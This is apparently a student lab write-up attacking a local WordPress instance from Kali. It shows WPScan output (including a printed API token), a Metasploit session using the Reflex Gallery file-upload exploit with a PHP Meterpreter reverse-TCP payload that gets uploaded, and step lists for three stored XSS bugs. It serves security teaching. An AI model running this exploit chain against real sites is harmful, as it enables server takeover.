Milestone 1: Plugin was downloaded and installed
Milestine 2: 

              ┌──(root💀kali)-[/home/kali/Desktop/wpVSkali]
              └─# wpscan --url http://localhost:8080 --api-token JMa8ESXowqf250XWDyth47svm2Q5JeCnRolIDaOktMU                                                                                                                 5 ⨯
              _______________________________________________________________
                      __          _______   _____
                      \ \        / /  __ \ / ____|
                        \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
                        \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
                          \  /\  /  | |     ____) | (__| (_| | | | |
                          \/  \/   |_|    |_____/ \___|\__,_|_| |_|

                      WordPress Security Scanner by the WPScan Team
                                      Version 3.8.17
                    Sponsored by Automattic - https://automattic.com/
                    @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
              _______________________________________________________________

              [+] URL: http://localhost:8080/ [::1]
              [+] Started: Sat Aug 28 02:00:02 2021

              Interesting Finding(s):

              [+] Headers
              | Interesting Entries:
              |  - Server: Apache/2.4.25 (Debian)
              |  - X-Powered-By: PHP/7.2.13
              | Found By: Headers (Passive Detection)
              | Confidence: 100%

              [+] XML-RPC seems to be enabled: http://localhost:8080/xmlrpc.php
              | Found By: Direct Access (Aggressive Detection)
              | Confidence: 100%
              | References:
              |  - http://codex.wordpress.org/XML-RPC_Pingback_API
              |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
              |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
              |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
              |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

              [+] WordPress readme found: http://localhost:8080/readme.html
              | Found By: Direct Access (Aggressive Detection)
              | Confidence: 100%

              [+] The external WP-Cron seems to be enabled: http://localhost:8080/wp-cron.php
              | Found By: Direct Access (Aggressive Detection)
              | Confidence: 60%
              | References:
              |  - https://www.iplocation.net/defend-wordpress-from-ddos
              |  - https://github.com/wpscanteam/wpscan/issues/1299

              [+] WordPress version 5.8 identified (Latest, released on 2021-07-20).
              | Found By: Rss Generator (Passive Detection)
              |  - http://localhost:8080/?feed=rss2, <generator>https://wordpress.org/?v=5.8</generator>
              |  - http://localhost:8080/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.8</generator>

              [+] WordPress theme in use: twentytwentyone
              | Location: http://localhost:8080/wp-content/themes/twentytwentyone/
              | Latest Version: 1.4 (up to date)
              | Last Updated: 2021-07-22T00:00:00.000Z
              | Readme: http://localhost:8080/wp-content/themes/twentytwentyone/readme.txt
              | Style URL: http://localhost:8080/wp-content/themes/twentytwentyone/style.css?ver=1.4
              | Style Name: Twenty Twenty-One
              | Style URI: https://wordpress.org/themes/twentytwentyone/
              | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
              | Author: the WordPress team
              | Author URI: https://wordpress.org/
              |
              | Found By: Css Style In Homepage (Passive Detection)
              |
              | Version: 1.4 (80% confidence)
              | Found By: Style (Passive Detection)
              |  - http://localhost:8080/wp-content/themes/twentytwentyone/style.css?ver=1.4, Match: 'Version: 1.4'

              [+] Enumerating All Plugins (via Passive Methods)
              [+] Checking Plugin Versions (via Passive and Aggressive Methods)

              [i] Plugin(s) Identified:

              [+] reflex-gallery
              | Location: http://localhost:8080/wp-content/plugins/reflex-gallery/
              | Last Updated: 2021-03-10T02:38:00.000Z
              | [!] The version is out of date, the latest version is 3.1.7
              |
              | Found By: Urls In Homepage (Passive Detection)
              |
              | [!] 2 vulnerabilities identified:
              |
              | [!] Title: Reflex Gallery <= 3.1.3 - Arbitrary File Upload
              |     Fixed in: 3.1.4
              |     References:
              |      - https://wpscan.com/vulnerability/c2496b8b-72e4-4e63-9d78-33ada3f1c674
              |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4133
              |      - https://www.exploit-db.com/exploits/36374/
              |      - https://packetstormsecurity.com/files/130845/
              |      - https://packetstormsecurity.com/files/131515/
              |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_reflexgallery_file_upload/
              |
              | [!] Title: Multiple Plugins - jQuery prettyPhoto DOM Cross-Site Scripting (XSS)
              |     Fixed in: 3.1.5
              |     References:
              |      - https://wpscan.com/vulnerability/ad9df355-9928-411c-8b09-f9969d7cf449
              |      - https://blog.anantshri.info/forgotten_disclosure_dom_xss_prettyphoto
              |      - https://github.com/scaron/prettyphoto/issues/149
              |      - https://github.com/wpscanteam/wpscan/issues/818
              |
              | Version: 3.1.3 (80% confidence)
              | Found By: Readme - Stable Tag (Aggressive Detection)
              |  - http://localhost:8080/wp-content/plugins/reflex-gallery/readme.txt

              [+] Enumerating Config Backups (via Passive and Aggressive Methods)
              Checking Config Backups - Time: 00:00:00 <====================================================================================================================================> (137 / 137) 100.00% Time: 00:00:00

              [i] No Config Backups Found.

              [+] WPScan DB API OK
              | Plan: free
              | Requests Done (during the scan): 0
              | Requests Remaining: 22

              [+] Finished: Sat Aug 28 02:00:07 2021
              [+] Requests Done: 141
              [+] Cached Requests: 41
              [+] Data Sent: 35.653 KB
              [+] Data Received: 21.854 KB
              [+] Memory used: 213.254 MB
              [+] Elapsed time: 00:00:05



Milestone 3:

            msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > db_status
            [*] Connected to msf. Connection type: postgresql.




Milestone 4:


          > Executing “sudo msfdb init && msfconsole”
          [sudo] password for kali: 
          [i] Database already started
          [i] The database appears to be already configured, skipping initialization
                                                            
          IIIIII    dTb.dTb        _.---._
            II     4'  v  'B   .'"".'/|\`.""'.
            II     6.     .P  :  .' / | \ `.  :
            II     'T;. .;P'  '.'  /  |  \  `.'
            II      'T; ;P'    `. /   |   \ .'
          IIIIII     'YvP'       `-.__|__.-'

          I love shells --egypt


                =[ metasploit v6.0.40-dev                          ]
          + -- --=[ 2119 exploits - 1138 auxiliary - 360 post       ]
          + -- --=[ 592 payloads - 45 encoders - 10 nops            ]
          + -- --=[ 8 evasion                                       ]

          Metasploit tip: Use help <command> to learn more 
          about any command

          msf6 > search Reflex

          Matching Modules
          ================

            #  Name                                              Disclosure Date  Rank       Check  Description
            -  ----                                              ---------------  ----       -----  -----------
            0  exploit/unix/webapp/wp_reflexgallery_file_upload  2012-12-30       excellent  Yes    Wordpress Reflex Gallery Upload Vulnerability


          Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/wp_reflexgallery_file_upload

          msf6 > use xploit/unix/webapp/wp_reflexgallery_file_upload
          [*] No payload configured, defaulting to php/meterpreter/reverse_tcp                                                     
                                                                                                                                                                
          Matching Modules                                                                                                                                      
          ================                                                                                                                                      
                                                                                                                                                                
            #  Name                                              Disclosure Date  Rank       Check  Description                                                
            -  ----                                              ---------------  ----       -----  -----------                                                     
            0  exploit/unix/webapp/wp_reflexgallery_file_upload  2012-12-30       excellent  Yes    Wordpress Reflex Gallery Upload Vulnerability                   
                                                                                                                                                                          
                                                                                                                                                                          
          Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/wp_reflexgallery_file_upload                                          
                                                                                                                                                                              
          [*] Using exploit/unix/webapp/wp_reflexgallery_file_upload                                                                                                          
          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > use exploit/unix/webapp/wp_reflexgallery_file_upload                                                       
          [*] Using configured payload php/meterpreter/reverse_tcp                                                                                                            
          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set RHOST localhost:8080                                                                                    
          RHOST => localhost:8080
          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > exploit

          [-] Exploit failed: One or more options failed to validate: RHOSTS.
          [*] Exploit completed, but no session was created.
          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > search Reflex

          Matching Modules
          ================

            #  Name                                              Disclosure Date  Rank       Check  Description
            -  ----                                              ---------------  ----       -----  -----------
            0  exploit/unix/webapp/wp_reflexgallery_file_upload  2012-12-30       excellent  Yes    Wordpress Reflex Gallery Upload Vulnerability


          Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/wp_reflexgallery_file_upload

          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > use 0
          [*] Using configured payload php/meterpreter/reverse_tcp
          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set RHOST localhost:8080
          RHOST => localhost:8080
          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set LHOST 127.0.0.1
          LHOST => 127.0.0.1
          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > exploit

          [-] Exploit failed: One or more options failed to validate: RHOSTS.
          [*] Exploit completed, but no session was created.
          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > 
          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set LHOST kali:8080
          LHOST => kali:8080
          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > exploit

          [-] Exploit failed: One or more options failed to validate: RHOSTS.
          [*] Exploit completed, but no session was created.
          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set RHOSTS localhost:8080
          RHOSTS => localhost:8080
          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > exploit

          [-] Exploit failed: One or more options failed to validate: RHOSTS.
          [*] Exploit completed, but no session was created.
          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set RHOSTS localhost
          RHOSTS => localhost
          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > exploit
          [*] Exploiting target {:address=>"0.0.0.1", :hostname=>"localhost"}

          [-] Exploit failed: One or more options failed to validate: LHOST.
          [*] Exploiting target {:address=>"127.0.0.1", :hostname=>"localhost"}
          [-] Exploit failed: One or more options failed to validate: LHOST.
          [*] Exploit completed, but no session was created.
          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set LHOST localhost
          LHOST => localhost
          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > exploit
          [*] Exploiting target {:address=>"0.0.0.1", :hostname=>"localhost"}

          [!] You are binding to a loopback address by setting LHOST to ::1. Did you want ReverseListenerBindAddress?
          [*] Started reverse TCP handler on ::1:4444 
          [-] Exploit aborted due to failure: unknown: Server did not respond in an expected way
          [*] Exploiting target {:address=>"127.0.0.1", :hostname=>"localhost"}
          [!] You are binding to a loopback address by setting LHOST to ::1. Did you want ReverseListenerBindAddress?
          [*] Started reverse TCP handler on ::1:4444 
          [-] Exploit aborted due to failure: unknown: Server did not respond in an expected way
          [*] Exploit completed, but no session was created.
          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set LHOST 127.0.0.1
          LHOST => 127.0.0.1
          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set RHOSTS 127.0.0.1
          RHOSTS => 127.0.0.1
          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > exploit

          [!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
          [*] Started reverse TCP handler on 127.0.0.1:4444 
          [-] Exploit aborted due to failure: unknown: Server did not respond in an expected way
          [*] Exploit completed, but no session was created.
          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set LPORT 8080
          LPORT => 8080
          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set RPORT 8080
          RPORT => 8080
          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > exploit

          [!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
          [-] Handler failed to bind to 127.0.0.1:8080:-  -
          [-] Handler failed to bind to 0.0.0.0:8080:-  -
          [-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:8080).
          [*] Exploit completed, but no session was created.
          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set RHOSTS locahost
          RHOSTS => locahost
          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set LHOST localhost
          LHOST => localhost
          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > exploit

          [-] Exploit failed: One or more options failed to validate: RHOSTS.
          [*] Exploit completed, but no session was created.
          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set RHOSTS kali
          RHOSTS => kali
          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > exploit

          [!] You are binding to a loopback address by setting LHOST to ::1. Did you want ReverseListenerBindAddress?
          [*] Started reverse TCP handler on ::1:8080 
          [+] Our payload is at: ZhvOTbvx.php. Calling payload...
          [*] Calling payload...
          [!] This exploit may require manual cleanup of 'ZhvOTbvx.php' on the target
          [*] Exploit completed, but no session was created.



# Wordpress VS Kali

Exploits :

1 - XSS vulnerability found in plugin's Update-page
-> By adding script to the php of our plugin, we were able to exploit an XSS vulnerability within the update page of the plgugin tab.

Steps:

- Navigate to plugins page
- Go to the editor
- Add some script to the php
- Update the file
- Navigate to "Updates" tab under Dashboard

Tested Version: 4.2
Fixed Version: 4.7.1

<img src="https://github.com/anushareddy139/Assignment/blob/main/plugin-XSS.gif" width="750">


2 - XSS vulnerability in Page's Edit-page

-> By adding a script to the title of a page, we can exploit an XSS vulnerability. This script does not show up on the published blog page, but still triggers the alert.

Steps:

- Navigate to All Pages
- Select a page to edit
- Add some script to the end of page title
- Update the page
- Check the published website to see the script activate

Tested Version: 4.2
Fixed Version: 4.7.1

<img src="https://github.com/anushareddy139/Assignment/blob/main/edit_page-XSS.gif" width=750>


3 - XSS vulnerability in Post's Edit-page

-> By adding a script to the end of a post title, we are able to trigger that script as soon as we load the main page of the application.

Steps:

- Navigate to the Post tab
- Select a post to edit
- Add some script to the end of the post title
- Update the post
- Navigate to the main page

Tested Version: 4.2
Fixed Version: 4.2.5

<img src="https://github.com/anushareddy139/Assignment/blob/main/post_title-XSS.gif" width=800>

